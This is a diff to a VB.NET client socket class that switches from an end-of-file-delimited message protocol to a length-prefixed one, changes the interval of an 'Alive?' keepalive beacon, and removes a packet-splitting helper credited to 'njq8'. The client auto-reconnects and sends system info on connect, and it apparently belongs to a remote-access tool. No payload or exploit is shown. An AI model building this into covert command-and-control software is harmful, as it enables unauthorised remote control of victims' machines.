@@ -4,14 +4,12 @@ Imports System.Text
 Imports System.IO
 Public Class ClientSocket
 
-    Public Shared S As Socket
-    Public Shared Buffer(1024 * 5000) As Byte
-    Public Shared MS As New MemoryStream
-
-    Public Shared EOF As String = "<EOF>"
-    Public Shared SPL As String = "<N>"
-
     Public Shared isConnected As Boolean = False
+    Public Shared S As Socket
+    Public Shared BufferLength As Long = Nothing
+    Public Shared Buffer() As Byte
+    Public Shared MS As New MemoryStream
+    Public Shared SPL As String = "<N>"
 
 
     Public Shared Sub BeginConnect()
@@ -23,7 +21,8 @@ Public Class ClientSocket
             Dim ipAddress As IPAddress = IPAddress.Parse("127.0.0.1")
             Dim ipEndPoint As IPEndPoint = New IPEndPoint(ipAddress, 2020)
 
-            Buffer = New Byte(1024 * 5000) {}
+            BufferLength = -1
+            Buffer = New Byte(0) {}
             MS = New MemoryStream
 
             S.ReceiveBufferSize = 1024 * 5000
@@ -33,15 +32,15 @@ Public Class ClientSocket
             isConnected = True
             Send(Info)
 
-            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf EndReceive), S)
+            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
 
             While isConnected
-                Threading.Thread.Sleep(10 * 1000)
                 Send("Alive?")
+                Threading.Thread.Sleep(60 * 1000)
             End While
 
         Catch ex As Exception
-            Disconnected()
+            isDisconnected()
         End Try
 
     End Sub
@@ -53,49 +52,69 @@ Public Class ClientSocket
 
     End Function
 
-    Private Shared Sub EndReceive(ByVal ar As IAsyncResult)
+    Public Shared Sub BeginReceive(ByVal ar As IAsyncResult)
+        If isConnected = False Then isDisconnected()
         Try
-            S = ar.AsyncState
             Dim Received As Integer = S.EndReceive(ar)
             If Received > 0 Then
-                MS.Write(Buffer, 0, Received)
-                Diagnostics.Debug.WriteLine(String.Format("Received {0}", Received))
-re:
-                If BS(MS.ToArray).Contains(EOF) Then
+                If BufferLength = -1 Then
+                    If Buffer(0) = 0 Then
+                        BufferLength = BS(MS.ToArray)
+                        MS.Dispose()
+                        MS = New MemoryStream
 
-                    Dim A As Array = SplitWord(MS.ToArray, EOF)
-                    Dim T As New Threading.Thread(New Threading.ParameterizedThreadStart(AddressOf Messages.Read))
-                    T.Start(A(0))
-
-                    MS.Flush()
-                    MS.Dispose()
-                    MS = New MemoryStream
-
-                    If A.Length = 2 Then
-                        MS.Write(A(1), 0, A(1).length)
-                        GoTo re
+                        If BufferLength = 0 Then
+                            BufferLength = -1
+                            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
+                            Return
+                        End If
+                        Buffer = New Byte(BufferLength - 1) {}
+                    Else
+                        MS.WriteByte(Buffer(0))
                     End If
-
+                Else
+                    MS.Write(Buffer, 0, Received)
+                    If (MS.Length = BufferLength) Then
+                        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf BeginRead), MS.ToArray)
+                        BufferLength = -1
+                        MS.Dispose()
+                        MS = New MemoryStream
+                        Buffer = New Byte(0) {}
+                    Else
+                        Buffer = New Byte(BufferLength - MS.Length - 1) {}
+                    End If
                 End If
             End If
-
-            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf EndReceive), S)
+            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
+            Return
         Catch ex As Exception
-            isConnected = False
+            isDisconnected()
+        End Try
+    End Sub
+
+    Public Shared Sub BeginRead(ByVal b As Byte())
+        Try
+            Messages.Read(b)
+        Catch ex As Exception
         End Try
     End Sub
 
     Public Shared Sub Send(ByVal msg As String)
         Try
-            Dim M As New MemoryStream
-            M.Write(SB(msg), 0, msg.Length)
-            M.Write(SB(EOF), 0, EOF.Length)
+            Dim MS As New MemoryStream
+            Dim B As Byte() = SB(msg)
+            Dim L As Byte() = SB(B.Length & CChar(vbNullChar))
+
+            MS.Write(L, 0, L.Length)
+            MS.Write(B, 0, B.Length)
+
             S.Poll(-1, SelectMode.SelectWrite)
-            S.BeginSend(M.ToArray, 0, M.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), S)
-            M.Flush()
-            M.Dispose()
+            S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
+
+            MS.Flush()
+            MS.Dispose()
         Catch ex As Exception
-            Disconnected()
+            isDisconnected()
         End Try
     End Sub
 
@@ -106,7 +125,7 @@ re:
         End Try
     End Sub
 
-    Private Shared Sub Disconnected()
+    Private Shared Sub isDisconnected()
         isConnected = False
 
         Try
@@ -129,24 +148,5 @@ re:
         BeginConnect()
 
     End Sub
-
-    'credit to njq8
-    'a better way to split packets
-    Private Shared Function SplitWord(ByVal b As Byte(), ByVal Word As String) As Array
-        Try
-            Dim a As New Collections.Generic.List(Of Byte())
-            Dim M As New MemoryStream
-            Dim MM As New MemoryStream
-            Dim T As String() = Split(BS(b), Word)
-            M.Write(b, 0, T(0).Length)
-            MM.Write(b, T(0).Length + Word.Length, b.Length - (T(0).Length + Word.Length))
-            a.Add(M.ToArray)
-            a.Add(MM.ToArray)
-            M.Dispose()
-            MM.Dispose()
-            Return a.ToArray
-        Catch ex As Exception
-        End Try
-    End Function
 
 End Class
